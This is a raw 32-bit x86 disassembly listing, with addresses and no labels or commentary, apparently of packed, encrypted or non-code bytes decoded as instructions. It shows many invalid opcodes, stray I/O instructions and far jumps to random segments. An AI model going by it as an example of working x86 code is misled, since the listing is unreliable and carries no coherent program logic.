  414a42:	xchg   esp,eax
  414a43:	pop    eax
  414a44:	fsincos 
  414a46:	add    DWORD PTR [eax+0x19],ebx
  414a49:	test   edi,0xa7c8a963
  414a4f:	mov    BYTE PTR [eax+eiz*1],cl
  414a52:	jmp    0xaaa4505d
  414a57:	push   0xffffffea
  414a59:	ins    BYTE PTR es:[edi],dx
  414a5a:	xlat   BYTE PTR ds:[ebx]
  414a5b:	add    DWORD PTR [eax-0xcd1ccaf],0x65
  414a62:	cmp    eax,0x581dbed5
  414a67:	adc    al,dl
  414a69:	fsubr  DWORD PTR [eax+0x431ae9ba]
  414a6f:	clc    
  414a70:	sbb    eax,0xc23e1b0d
  414a75:	fisttp DWORD PTR [edi+ecx*2+0x1a]
  414a79:	rcl    BYTE PTR [eax+0x36],0xa4
  414a7d:	and    bl,bl
  414a7f:	fcom   QWORD PTR [edx+0x14]
  414a82:	cmp    eax,0x94a03103
  414a87:	leave  
  414a88:	clc    
  414a89:	retf   
  414a8a:	adc    eax,0x24897e42
  414a8f:	lahf   
  414a90:	xchg   edx,eax
  414a91:	std    
  414a92:	je     0x414a46
  414a94:	xchg   edi,eax
  414a95:	in     al,0x38
  414a97:	bound  eax,QWORD PTR [edx-0xa4b06d5]
  414a9d:	mov    ds:0xc0b4bbce,al
  414aa2:	inc    edx
  414aa3:	mov    dh,0xd0
  414aa5:	fcomp  QWORD PTR [eax-0x76]
  414aa8:	adc    bl,BYTE PTR [ebx]
  414aaa:	pusha  
  414aab:	sub    esi,DWORD PTR [ebx]
  414aad:	cwde   
  414aae:	cmp    al,0xb6
  414ab0:	mov    eax,ds:0x4ae754cf
  414ab5:	mov    edi,0x65133fae
  414aba:	pop    ebx
  414abb:	call   0xfb48ed17
  414ac0:	or     BYTE PTR [ebx],0xf1
  414ac3:	mov    dl,0x72
  414ac5:	lods   eax,DWORD PTR ds:[esi]
  414ac6:	jo     0x414a8f
  414ac8:	mov    bl,0xf3
  414aca:	push   edx
  414acb:	dec    ecx
  414acc:	outs   dx,BYTE PTR ds:[esi]
  414acd:	das    
  414ace:	test   al,bh
  414ad0:	test   eax,0x7e5cc716
  414ad5:	(bad)  
  414ad6:	out    dx,al
  414ad7:	and    dl,0x8e
  414ada:	push   esp
  414adb:	lods   eax,DWORD PTR ds:[esi]
  414adc:	xchg   edi,eax
  414add:	mov    ah,0x99
  414adf:	mov    ds:0xb6123e73,eax
  414ae4:	cld    
  414ae5:	loop   0x414b1a
  414ae7:	repz xor dl,BYTE PTR [ebx]
  414aea:	(bad)  
  414aeb:	mov    WORD PTR [ecx+ebx*1+0x62],?
  414aef:	retf   0xf682
  414af2:	fs js  0x414ac1
  414af5:	pushf  
  414af6:	pusha  
  414af7:	dec    edi
  414af8:	fucomp st(5)
  414afa:	push   esp
  414afb:	daa    
  414afc:	repz clc 
  414afe:	xchg   ecx,eax
  414aff:	and    al,0xaf
  414b01:	cwde   
  414b02:	(bad)  
  414b03:	imul   dh
  414b05:	mov    ?,WORD PTR [esi]
  414b07:	retf   
  414b08:	push   esi
  414b09:	mov    edi,ecx
  414b0b:	loop   0x414ace
  414b0d:	(bad)  [ebx-0x4d35a522]
  414b13:	rcr    BYTE PTR [edx+0x3e],1
  414b16:	pushf  
  414b17:	fs push eax
  414b19:	inc    esp
  414b1a:	aam    0x15
  414b1c:	call   0xd5c44101
  414b21:	enter  0xbb6a,0xb8
  414b25:	retf   0xd144
  414b28:	test   al,0x2
  414b2a:	in     eax,0x54
  414b2c:	dec    ebp
  414b2d:	popa   
  414b2e:	outs   dx,DWORD PTR ds:[esi]
  414b2f:	loope  0x414b21
  414b31:	cmp    DWORD PTR [esi],ecx
  414b33:	or     eax,0x4aacc73b
  414b38:	cdq    
  414b39:	dec    edx
  414b3a:	dec    esp
  414b3b:	aaa    
  414b3c:	jae    0x414b55
  414b3e:	outs   dx,DWORD PTR ds:[esi]
  414b3f:	mov    ebp,0x6b884bb3
  414b44:	inc    ebx
  414b45:	add    al,0x7f
  414b47:	jp     0x414ae7
  414b49:	pop    eax
  414b4a:	adc    eax,0x91137e2c
  414b4f:	adc    DWORD PTR [eax+0x7f03ff57],0x4b99332
  414b59:	add    al,0xff
  414b5b:	fcomp  QWORD PTR ss:[ebx-0x12ea6f77]
  414b62:	inc    ebp
  414b63:	pop    ebp
  414b64:	retf   0x981
  414b67:	cdq    
  414b68:	and    eax,ebp
  414b6a:	std    
  414b6b:	and    al,0x7a
  414b6d:	mov    BYTE PTR [edx+0x7d],bh
  414b70:	ror    DWORD PTR [ebp+0x6a],cl
  414b73:	repz mov ss,WORD PTR [edx+ebx*1]
  414b77:	fld    DWORD PTR [ecx+0x1225567e]
  414b7d:	in     al,dx
  414b7e:	outs   dx,DWORD PTR ds:[esi]
  414b7f:	xlat   BYTE PTR ds:[ebx]
  414b80:	stos   BYTE PTR es:[edi],al
  414b81:	popa   
  414b82:	retf   
  414b83:	sti    
  414b84:	out    dx,al
  414b85:	sub    dl,BYTE PTR [ecx]
  414b87:	adc    BYTE PTR ds:0x18774270,ah
  414b8d:	push   0x219337e6
  414b92:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414b93:	neg    BYTE PTR [esi+0x295d06bf]
  414b99:	dec    ecx
  414b9a:	and    edx,esi
  414b9c:	xlat   BYTE PTR ds:[ebx]
  414b9d:	test   eax,0x428d88f8
  414ba2:	xor    al,0xe3
  414ba4:	stos   BYTE PTR es:[edi],al
  414ba5:	cmp    BYTE PTR [ecx],dh
  414ba7:	repnz xor ah,cl
  414baa:	mov    eax,ds:0xddc0c8ac
  414baf:	mov    ds:0x44e65fcf,al
  414bb4:	ins    DWORD PTR es:[edi],dx
  414bb5:	xor    al,0x7b
  414bb7:	push   esp
  414bb8:	mov    ecx,DWORD PTR [edx+0x6f]
  414bbb:	in     eax,0x81
  414bbd:	fstp   TBYTE PTR [eax]
  414bbf:	xor    dh,dl
  414bc1:	cmp    eax,0x2a4dbb6a
  414bc6:	mov    esp,DWORD PTR [esp+edx*1]
  414bc9:	cwde   
  414bca:	mov    eax,ds:0x53f3c9c2
  414bcf:	lods   eax,DWORD PTR ds:[esi]
  414bd0:	lods   eax,DWORD PTR ds:[esi]
  414bd1:	pop    ds
  414bd2:	mov    al,ds:0x48153eb2
  414bd7:	imul   eax,DWORD PTR [ebx-0x63],0x11
  414bdb:	out    dx,eax
  414bdc:	pop    ds
  414bdd:	xor    BYTE PTR [ecx-0x5c9d784e],cl
  414be3:	lock add DWORD PTR ds:0x779c01b3,ecx
  414bea:	inc    edx
  414beb:	repz sar DWORD PTR [eax+edx*8],1
  414bef:	(bad)  
  414bf0:	scas   eax,DWORD PTR es:[edi]
  414bf1:	jno    0x414c08
  414bf3:	and    al,0x17
  414bf5:	lds    ebp,FWORD PTR [edx+0x636b7dec]
  414bfb:	adc    ecx,DWORD PTR [edi+0x3f84104]
  414c01:	add    eax,0xde348e59
  414c06:	xchg   ebp,eax
  414c07:	sub    BYTE PTR [ebp+0x4c191617],bh
  414c0d:	ds popf 
  414c0f:	retf   0x643c
  414c12:	cs int3 
  414c14:	push   ebx
  414c15:	rcr    cl,1
  414c17:	fwait
  414c18:	add    al,0x4d
  414c1a:	leave  
  414c1b:	pop    es
  414c1c:	mov    ah,0xce
  414c1e:	fcmove st,st(7)
  414c20:	enter  0x61b,0x90
  414c24:	push   ss
  414c25:	dec    ebp
  414c26:	aas    
  414c27:	xchg   edi,eax
  414c28:	outs   dx,DWORD PTR ds:[esi]
  414c29:	(bad)  
  414c2b:	mov    esp,0x2a3fa3dc
  414c30:	int    0xe7
  414c32:	mov    edi,0x7b49066e
  414c37:	mov    BYTE PTR [edx+0x17d12c22],cl
  414c3d:	test   DWORD PTR [edi-0x7b],ebx
  414c40:	gs test eax,0x16245608
  414c46:	push   ebx
  414c47:	ror    BYTE PTR [ecx],cl
  414c49:	scas   eax,DWORD PTR es:[edi]
  414c4a:	in     al,dx
  414c4b:	aam    0x31
  414c4d:	icebp  
  414c4e:	dec    edx
  414c4f:	aaa    
  414c50:	inc    esi
  414c51:	jmp    0xd6b:0x61b12c4c
  414c58:	pop    ds
  414c59:	jmp    0x48cafe09
  414c5e:	ss (bad) 
  414c60:	out    0x25,eax
  414c62:	pop    ecx
  414c63:	jg     0x414bf7
  414c65:	jge    0x414c3c
  414c67:	pop    es
  414c68:	test   bl,ch
  414c6a:	repz dec edi
  414c6c:	out    0x29,eax
  414c6e:	stc    
  414c6f:	inc    edi
  414c70:	fwait
  414c71:	(bad)  
  414c72:	test   al,0x27
  414c74:	push   ecx
  414c75:	jmp    0xcb66:0x9b440ce6
  414c7c:	or     DWORD PTR [eax+0x94021d7],eax
  414c82:	fild   WORD PTR [esp+ebp*8+0x34]
  414c86:	ror    BYTE PTR [ebp+0x50ad5e59],cl
  414c8c:	mov    ecx,0x5a158612
  414c91:	cdq    
  414c92:	pop    esp
  414c93:	ret    0xf88f
  414c96:	push   es
  414c97:	pusha  
  414c98:	test   al,0x5b
  414c9a:	loopne 0x414c34
  414c9c:	cmp    esi,DWORD PTR [ebx+0x38]
  414c9f:	(bad)  
  414ca0:	cli    
  414ca1:	pop    ss
  414ca2:	mov    ch,0x2a
  414ca4:	jecxz  0x414cf5
  414ca6:	loopne 0x414d18
  414ca8:	mov    eax,eax
  414caa:	repnz out dx,al
  414cac:	cmp    al,0xfe
  414cae:	popf   
  414caf:	and    ebp,esp
  414cb1:	push   ds
  414cb2:	jl     0x414c8e
  414cb4:	je     0x414d31
  414cb6:	outs   dx,BYTE PTR ds:[esi]
  414cb7:	fdivr  QWORD PTR [ecx-0x30982f8d]
  414cbd:	out    0x7d,al
  414cbf:	shr    BYTE PTR ds:0x73194e68,cl
  414cc5:	out    0x1b,al
  414cc7:	xor    ch,BYTE PTR [ebx-0x3f]
  414cca:	test   eax,0xdeb88c8
  414ccf:	js     0x414cec
  414cd1:	fcom   st(4)
  414cd3:	or     ch,ch
  414cd5:	fimul  WORD PTR [ecx]
  414cd7:	test   eax,0xfa4beb00
  414cdc:	push   ss
  414cdd:	mov    dl,0x5f
  414cdf:	rcl    DWORD PTR [edi-0x9],1
  414ce2:	enter  0x79d2,0x7b
  414ce6:	sbb    eax,0x1f1889f7
  414ceb:	retf   
  414cec:	or     eax,0x688e29c6
  414cf1:	rcr    DWORD PTR [edx+0x55],0x77
  414cf5:	mov    cs,WORD PTR ds:0xd6f35845
  414cfb:	das    
  414cfc:	icebp  
  414cfd:	ja     0x414c86
  414cff:	mov    cl,0x3e
  414d01:	cdq    
  414d02:	jo     0x414cf7
  414d04:	sti    
  414d05:	add    eax,0xd508bf58
  414d0a:	jg     0x414c9c
  414d0c:	rcr    edi,1
  414d0e:	enter  0xa7df,0x3b
  414d12:	std    
  414d13:	mov    dl,0x4b
  414d15:	or     eax,0xb87fe30a
  414d1a:	mov    edx,0xe0592377
  414d1f:	cs aam 0x2f
  414d22:	aad    0xe5
  414d24:	test   BYTE PTR [ebp+ebp*2-0x6e],ah
  414d28:	jmp    0x414d7a
  414d2a:	fimul  WORD PTR [esp+ebp*2+0x20]
  414d2e:	int3   
  414d2f:	or     eax,DWORD PTR [edx]
  414d31:	jo     0x414ce4
  414d33:	push   ss
  414d34:	xchg   edx,eax
  414d35:	arpl   WORD PTR [ecx+0x3c07b062],sp
  414d3b:	inc    ebx
  414d3c:	xchg   DWORD PTR [ebx],ebp
  414d3e:	xchg   DWORD PTR [ebp+0x25f05a38],edx
  414d44:	xor    ah,dl
  414d46:	call   0x850b:0x114906ef
  414d4d:	dec    eax
  414d4e:	jmp    0x4e3b8cee
  414d53:	(bad)  
  414d54:	das    
  414d55:	ds pop ss
  414d57:	mov    ecx,0x6c71a2d8
  414d5c:	sbb    DWORD PTR [ebx+0x6b],esp
  414d5f:	fld    QWORD PTR [edx]
  414d61:	cmp    esp,DWORD PTR [ebp+0x5c]
  414d64:	lods   eax,DWORD PTR ds:[esi]
  414d65:	cli    
  414d66:	stos   BYTE PTR es:[edi],al
  414d67:	or     DWORD PTR [ebx-0x43],ebx
  414d6a:	xor    ecx,ecx
  414d6c:	mov    bl,0x3b
  414d6f:	inc    eax
  414d70:	(bad)  
  414d71:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414d72:	sbb    eax,0xeb74ac5f
  414d77:	adc    al,0xf0
  414d79:	lds    ebp,FWORD PTR [ebp+0x219f7b40]
  414d7f:	pop    ebx
  414d80:	inc    edx
  414d81:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414d82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414d83:	daa    
  414d84:	mov    al,ds:0xaa2e053a
  414d89:	cwde   
  414d8a:	jecxz  0x414d5c
  414d8c:	out    0x55,al
  414d8e:	push   ss
  414d8f:	xchg   DWORD PTR [edi],eax
  414d91:	cmc    
  414d92:	xchg   ecx,eax
  414d93:	mov    ah,0xc2
  414d95:	cmp    DWORD PTR [edx+eax*1-0xbdbc7df],ebx
  414d9c:	xlat   BYTE PTR ds:[ebx]
  414d9d:	cmp    dh,BYTE PTR [ecx]
  414d9f:	sub    esp,DWORD PTR [esi-0x69]
  414da2:	dec    ebx
  414da3:	adc    BYTE PTR [ecx],ch
  414da5:	sbb    dl,BYTE PTR [esi+0x47]
  414da8:	lahf   
  414da9:	scas   al,BYTE PTR es:[edi]
  414daa:	dec    edi
  414dab:	sub    eax,0xa2e39a34
  414db0:	mov    esp,0x85a244cc
  414db5:	sets   BYTE PTR [edi+eiz*1-0x66]
  414dba:	shr    al,0x7
  414dbd:	add    dh,BYTE PTR [ebp*2-0xd0e674d]
  414dc4:	jmp    0xfb77:0x898b0ba1
  414dcb:	mov    dl,ch
  414dcd:	loope  0x414d86
  414dcf:	adc    al,0x54
  414dd1:	jmp    0xbd42:0xe3d3416e
  414dd8:	das    
  414dd9:	out    dx,eax
  414dda:	ja     0x414dde
  414ddc:	jns    0x414e0a
  414dde:	(bad)  
  414ddf:	jl     0x414de5
  414de1:	and    ebp,edx
  414de3:	pop    ecx
  414de4:	(bad)  
  414de6:	pop    ss
  414de7:	(bad)  
  414de8:	fdivr  QWORD PTR [ecx-0x48]
  414deb:	xchg   esp,eax
  414dec:	loop   0x414db8
  414dee:	dec    esi
  414def:	fwait
  414df0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414df1:	cmp    bl,dh
  414df3:	outs   dx,BYTE PTR ds:[esi]
  414df4:	cs fcmove st,st(2)
  414df7:	repz pop ebp
  414df9:	fwait
  414dfa:	or     BYTE PTR [esi*2+0x2ead4850],ch
  414e01:	push   ds
  414e02:	pop    eax
  414e03:	xchg   esi,eax
  414e04:	ret    0x9d78
  414e07:	inc    esi
  414e08:	in     eax,dx
  414e09:	arpl   WORD PTR [edi+0x30c3d98d],dx
  414e0f:	xchg   edx,eax
  414e10:	pop    ss
  414e11:	jo     0x414dbd
  414e13:	(bad)  
  414e14:	out    dx,eax
  414e15:	inc    esi
  414e16:	aas    
  414e17:	add    eax,0xd1c87523
  414e1c:	adc    esi,DWORD PTR [eax+0x7f]
  414e1f:	dec    edx
  414e20:	fisubr WORD PTR [ebx]
  414e22:	inc    esp
  414e23:	call   0x85d1:0xaec13b6b
  414e2a:	test   BYTE PTR [ebx],bl
  414e2c:	(bad)  
  414e2d:	call   0x689c:0x1eab3260
  414e34:	push   ebx
  414e35:	jo     0x414e66
  414e37:	rcl    BYTE PTR [ecx+0x7587cbc9],cl
  414e3d:	iret   
  414e3e:	mov    ecx,0xe1405916
  414e43:	shr    BYTE PTR [edx+0x1e],cl
  414e46:	mov    ecx,0x7d3f6e45
  414e4b:	push   ebx
  414e4c:	aaa    
  414e4d:	sahf   
  414e4e:	inc    esi
  414e4f:	popf   
  414e50:	mov    ds:0x923e39cc,eax
  414e55:	mov    WORD PTR [edi],ss
  414e57:	(bad)  
  414e58:	repz cmp edi,DWORD PTR [ecx+eiz*4]
  414e5c:	xchg   BYTE PTR [edi-0xdd41b18],bh
  414e62:	ss push ecx
  414e64:	inc    ebx
  414e65:	sbb    DWORD PTR [ecx],eax
  414e67:	cli    
  414e68:	fiadd  WORD PTR es:[esi]
  414e6b:	push   ebp
  414e6c:	or     BYTE PTR [ebp-0xa34246f],bh
  414e72:	aad    0x1d
  414e74:	dec    ebp
  414e75:	xchg   ecx,eax
  414e76:	add    al,0xd7
  414e78:	out    0xf0,eax
  414e7a:	(bad)  
  414e7b:	jp     0x414ec0
  414e7d:	push   ds
  414e7e:	mov    al,ds:0xe88986ee
  414e83:	scas   al,BYTE PTR es:[edi]
  414e84:	std    
  414e85:	loop   0x414e4f
  414e87:	pop    ebp
  414e88:	push   es
  414e89:	mov    al,0xc4
  414e8b:	push   edx
  414e8c:	in     al,dx
  414e8d:	dec    eax
  414e8e:	loopne 0x414e2d
  414e90:	jae    0x414e80
  414e92:	cmp    ecx,DWORD PTR [eax-0x3172a83b]
  414e98:	xchg   ebx,eax
  414e99:	or     DWORD PTR [esi-0x419c21f1],esp
  414e9f:	out    0xde,eax
  414ea1:	pop    esp
  414ea2:	out    0xe1,eax
  414ea4:	popa   
  414ea5:	sar    BYTE PTR [ebp-0x48],cl
  414ea8:	mov    ch,0x8e
  414eaa:	scas   al,BYTE PTR es:[edi]
  414eab:	pop    esi
  414eac:	xchg   esp,eax
  414ead:	(bad)  
  414eae:	push   DWORD PTR [edi-0x1d46106b]
  414eb4:	xor    BYTE PTR [edx],ah
  414eb6:	inc    esp
  414eb7:	fmul   st,st(6)
  414eb9:	std    
  414eba:	callw  0xca5a
  414ebe:	mov    ch,0x39
  414ec0:	std    
  414ec1:	xchg   ecx,eax
  414ec2:	lds    eax,FWORD PTR [ecx]
  414ec4:	pop    esi
  414ec5:	out    dx,al
  414ec6:	loopne 0x414ef1
  414ec8:	sbb    eax,0x7c018cc4
  414ecd:	test   BYTE PTR [esi+0x545d2274],dl
  414ed3:	mov    edi,0x723ccda9
  414ed8:	dec    esp
  414ed9:	popa   
  414eda:	(bad)  
  414edb:	pop    ebp
  414edc:	int3   
  414edd:	outs   dx,DWORD PTR ds:[esi]
  414ede:	shr    DWORD PTR [esi],0x3
  414ee1:	scas   al,BYTE PTR es:[edi]
  414ee2:	dec    ebx
  414ee3:	iret   
  414ee4:	adc    DWORD PTR [ebx-0x73],edx
  414ee7:	in     al,0x81
  414ee9:	das    
  414eea:	pop    es
  414eeb:	call   0x911ec7f8
  414ef0:	mov    bh,0xe7
  414ef2:	mov    eax,ds:0xce4dbd6
  414ef7:	jmp    0x8d65dd60
  414efc:	xor    cl,BYTE PTR ds:0x9faed5b1
  414f02:	jo     0x414eeb
  414f04:	mov    dl,0xec
  414f06:	pop    es
  414f07:	xor    cl,BYTE PTR [edi+0x4f]
  414f0a:	sbb    DWORD PTR [edx],ebx
  414f0c:	call   0x4ac2:0xc9da5f6a
  414f13:	adc    DWORD PTR [ebx+0x40e66106],ecx
  414f19:	(bad)  
  414f1a:	mov    ds:0x746e12ec,eax
  414f1f:	dec    ecx
  414f20:	add    ecx,DWORD PTR [edx+0x2f7f971e]
  414f26:	pop    esp
  414f27:	test   DWORD PTR [edi+0x33d0bf86],esi
  414f2d:	clc    
  414f2e:	jmp    0x414ee4
  414f30:	mov    BYTE PTR [esi],bl
  414f32:	shr    edi,1
  414f34:	mov    edx,0x70c5cc1f
  414f39:	mov    ah,0x21
  414f3b:	pop    ecx
  414f3c:	xchg   esp,eax
  414f3d:	fcmovne st,st(2)
  414f3f:	pop    ds
  414f40:	dec    ecx
  414f41:	mov    edi,?
  414f43:	mov    DWORD PTR [ecx+edx*4],edx
  414f46:	jecxz  0x414efa
  414f48:	dec    ebp
  414f49:	mov    cl,BYTE PTR [edx+0x9]
  414f4c:	lds    eax,FWORD PTR [esi]
  414f4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414f4f:	push   ebx
  414f50:	jo     0x414f65
  414f52:	imul   esp,DWORD PTR [ebp-0x154ce0f3],0x4932d2b4
  414f5c:	mov    ebp,0xa1e673d6
  414f61:	and    eax,0x77ff7781
  414f66:	add    edx,edi
  414f68:	scas   eax,DWORD PTR es:[edi]
  414f69:	sbb    al,0xab
  414f6b:	and    al,0xd5
  414f6d:	les    ebp,FWORD PTR [eax+ecx*8]
  414f70:	addr16 (bad) 
  414f72:	xchg   edi,eax
  414f73:	mov    ebx,0xac15235f
  414f78:	push   0xffffff98
  414f7a:	inc    edx
  414f7b:	test   BYTE PTR [esi+0x38],dl
  414f7e:	cld    
  414f7f:	scas   al,BYTE PTR es:[edi]
  414f80:	xlat   BYTE PTR ds:[ebx]
  414f81:	(bad)  
  414f82:	lods   al,BYTE PTR ds:[esi]
  414f83:	aad    0x3b
  414f85:	test   eax,0x3c652478
  414f8a:	jmp    0xe94ef748
  414f8f:	ret    
  414f90:	xchg   esi,eax
  414f91:	lock icebp 
  414f93:	ds gs in al,0x61
  414f97:	xor    ch,BYTE PTR [ebp+ebx*1-0x5e]
  414f9b:	lock fucomp st(6)
  414f9e:	jns    0x414f61
  414fa0:	(bad)  
  414fa1:	xchg   edx,eax
  414fa2:	jmp    0x6232c8e3
  414fa7:	cmc    
  414fa8:	cmp    eax,0x1c8dbc28
  414fad:	cmp    DWORD PTR [ebx+eiz*1],ebp
  414fb0:	xor    BYTE PTR [esi-0xb],0x5
  414fb4:	js     0x415005
  414fb6:	aad    0xb1
  414fb8:	daa    
  414fb9:	cli    
  414fba:	icebp  
  414fbb:	stos   DWORD PTR es:[edi],eax
  414fbc:	pushf  
  414fbd:	mov    al,ds:0x44ff235a
  414fc2:	sub    BYTE PTR [ebx],ah
  414fc4:	adc    DWORD PTR [ecx+0x7f0f8d55],esp
  414fca:	add    bh,al
  414fcc:	xor    eax,0xc56c8564
  414fd1:	enter  0x6ca9,0x24
  414fd5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414fd6:	fisttp WORD PTR [edi]
  414fd8:	push   cs
  414fd9:	(bad)  [ebp-0x7b805ecf]
  414fdf:	mov    bl,0x3d
  414fe1:	sub    ebp,esp
  414fe3:	movups XMMWORD PTR [edi+eiz*8-0x3f1ac3cc],xmm5
  414feb:	or     al,0xb
  414fed:	js     0x41505c
  414fef:	sbb    BYTE PTR [ebx+ecx*4+0xf],ah
  414ff3:	popa   
  414ff4:	adc    esp,edi
  414ff6:	pushf  
  414ff7:	out    dx,eax
  414ff8:	neg    DWORD PTR [ebx+ebx*8+0x32]
  414ffc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414ffd:	mov    cl,0xf6
  414fff:	retf   0x1205
  415002:	les    eax,FWORD PTR [ebx+0x4fecdc8a]
  415008:	sbb    al,0x65
  41500a:	es daa 
  41500c:	sbb    eax,0xbc8887ce
  415011:	ins    DWORD PTR es:[edi],dx
  415012:	adc    al,0x65
  415014:	mov    eax,ds:0x245c2e4b
  415019:	sbb    edi,DWORD PTR [ebx-0x4d]
  41501c:	jge    0x415063
  41501e:	or     BYTE PTR [ecx+ebx*2-0x4f],0x3c
  415023:	loopne 0x414fe0
  415025:	mov    BYTE PTR [ebx-0x73],dl
  415028:	adc    ch,dh
  41502a:	xchg   esi,eax
  41502b:	retf   0xa4f
  41502e:	xchg   esi,eax
  41502f:	and    ecx,ebx
  415031:	sbb    esi,DWORD PTR [ebp+0xff7b03b]
  415037:	int3   
  415038:	test   DWORD PTR [eax-0x1a],ecx
  41503b:	inc    esi
  41503c:	add    al,0xac
  41503e:	repz inc edx
  415040:	in     eax,dx
  415041:	stos   DWORD PTR es:[edi],eax
  415042:	xor    BYTE PTR [ebp-0xe3b168a],ch
  415048:	sub    DWORD PTR [edi],eax
  41504a:	pushf  
  41504b:	jno    0x415092
  41504d:	nop
  41504e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41504f:	ficomp WORD PTR [ebx-0x1d]
  415052:	mov    ch,0xd1
  415054:	loop   0x41509e
  415056:	cdq    
  415057:	(bad)  
  415058:	test   eax,0x64df000c
  41505d:	fwait
  41505e:	and    eax,0xf5a5757c
  415063:	and    BYTE PTR [edi+0x5cece659],bl
  415069:	pop    ebx
  41506a:	push   cs
  41506b:	adc    ebp,DWORD PTR [esp+esi*1+0x1f1d597e]
  415072:	lea    ecx,[ecx+edx*1]
  415075:	adc    eax,0x7efc3474
  41507a:	xor    DWORD PTR [ecx+0x11da6de],esi
  415080:	dec    edx
  415081:	jbe    0x41504e
  415083:	psadbw mm6,QWORD PTR [ecx-0x35df096e]
  41508a:	jl     0x415050
  41508c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41508d:	inc    ebx
  41508e:	dec    edi
  41508f:	mov    ah,0x88
  415091:	ret    
  415092:	fs adc DWORD PTR es:[eax+0x5e],ecx
  415097:	adc    DWORD PTR [ebp-0x471107],ebx
  41509d:	ficomp DWORD PTR [ebp-0x4e23fea9]
  4150a3:	popf   
  4150a4:	fisttp QWORD PTR [esi]
  4150a6:	jmp    0xb200:0x5e1c926e
  4150ad:	and    eax,0xed6b8999
  4150b2:	mov    ah,0x2d
  4150b4:	jb     0x4150d7
  4150b6:	xchg   ecx,eax
  4150b7:	add    BYTE PTR [edx+ebx*8],dl
  4150ba:	sahf   
  4150bb:	ins    BYTE PTR es:[edi],dx
  4150bc:	std    
  4150bd:	adc    edi,DWORD PTR [edx-0xa]
  4150c0:	test   eax,0x3667f63b
  4150c5:	loope  0x4150fa
  4150c7:	push   edi
  4150c8:	iret   
  4150c9:	add    DWORD PTR [ecx],0x7e0165de
  4150cf:	pop    ds
  4150d0:	jmp    0xafaf:0x7a07920e
  4150d7:	jb     0x4150fe
  4150d9:	xchg   DWORD PTR [edi-0x2e],edi
  4150dc:	fild   QWORD PTR [ebx]
  4150de:	mov    ebx,0xfcebdf97
  4150e3:	std    
  4150e4:	mov    ch,0x4f
  4150e6:	dec    esi
  4150e7:	repz adc DWORD PTR [edi+eiz*2],ebp
  4150eb:	sbb    al,0xd6
  4150ed:	dec    eax
  4150ee:	pop    edi
  4150ef:	mov    ds:0xc33a6acd,eax
  4150f4:	sub    dl,BYTE PTR [eax+0x62c3381e]
  4150fa:	int    0x30
  4150fc:	mov    BYTE PTR [eax],dl
  4150fe:	ror    BYTE PTR [ecx],1
  415100:	rcr    DWORD PTR [esi-0x4b],1
  415103:	inc    ebx
  415104:	jbe    0x415100
  415106:	ins    DWORD PTR es:[edi],dx
  415107:	jmp    FWORD PTR [edi]
  415109:	jle    0x415167
  41510b:	jns    0x415106
  41510d:	add    BYTE PTR [esi+ecx*2],0x67
  415111:	loopne 0x4150cf
  415113:	repz pop ebx
  415115:	and    eax,0x41d8255b
  41511a:	mov    dl,0x95
  41511c:	push   0x413439e3
  415121:	repnz sub BYTE PTR [esi],bl
  415124:	jne    0x41518c
  415126:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415127:	into   
  415128:	pusha  
  415129:	sbb    eax,0xc3ff484b
  41512e:	in     eax,dx
  41512f:	in     eax,dx
  415130:	(bad)  
  415131:	fisttp WORD PTR [esi]
  415133:	jnp    0x4151a9
  415135:	push   edx
  415136:	sub    BYTE PTR [ebx+0x35],cl
  415139:	add    BYTE PTR [ebx],ch
  41513b:	retf   
  41513c:	mov    cl,BYTE PTR [edi]
  41513e:	les    edi,FWORD PTR [ebx+edi*4+0x3adee5cf]
  415145:	mov    eax,ds:0xd704e178
  41514a:	call   0xd76b:0xcbe4f9f2
  415151:	dec    ebx
  415152:	fist   WORD PTR [ebx+0x4a9cd9e9]
  415158:	dec    edx
  415159:	fisub  DWORD PTR [edx-0x3044715a]
  41515f:	mov    WORD PTR [ebx+0x37],ss
  415162:	into   
  415163:	push   esp
  415164:	frstor [edx-0x6861e335]
  41516a:	adc    BYTE PTR [eax-0x4e],cl
  41516d:	push   esi
  41516e:	shr    edi,cl
  415170:	adc    bl,BYTE PTR [edx]
  415172:	add    bl,BYTE PTR [edx-0x45]
  415175:	push   ds
  415176:	rcl    BYTE PTR [eax-0x13],1
  415179:	xor    ah,BYTE PTR [esi-0x7d]
  41517c:	mov    BYTE PTR [ebp+0x52],cl
  41517f:	out    0xf,al
  415181:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415182:	push   edx
  415183:	scas   al,BYTE PTR es:[edi]
  415184:	mov    gs,WORD PTR [ecx+0x4642d32d]
  41518a:	sub    BYTE PTR [esi+ecx*8+0x24],ch
  41518e:	mov    ds:0x285a05d6,eax
  415193:	inc    esi
  415194:	ret    
  415195:	pop    eax
  415196:	in     eax,0x85
  415198:	retf   0xcb65
  41519b:	dec    ebx
  41519c:	push   ebp
  41519d:	fs nop
  41519f:	outs   dx,BYTE PTR ds:[esi]
  4151a0:	data16 icebp 
  4151a2:	sub    eax,0x8f02b94b
  4151a7:	cmp    dh,BYTE PTR [eax-0x62670151]
  4151ad:	scas   eax,DWORD PTR es:[edi]
  4151ae:	xor    eax,0x70661f90
  4151b3:	hlt    
  4151b4:	fnstsw WORD PTR [esi]
  4151b6:	stc    
  4151b7:	test   al,0x35
  4151b9:	repz inc edx
  4151bb:	int    0xb6
  4151bd:	pop    ebp
  4151be:	shl    BYTE PTR [esi-0x2aa26f00],cl
  4151c4:	xchg   DWORD PTR [eax],edi
  4151c6:	mov    eax,0x7ee9b478
  4151cb:	add    BYTE PTR [ecx],al
  4151cd:	pop    esp
  4151ce:	inc    ebp
  4151cf:	inc    edx
  4151d0:	in     eax,dx
  4151d1:	jmp    0x415239
  4151d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4151d4:	stos   BYTE PTR es:[edi],al
  4151d5:	test   cl,0x5a
  4151d8:	dec    esp
  4151d9:	stc    
  4151da:	jg     0x415239
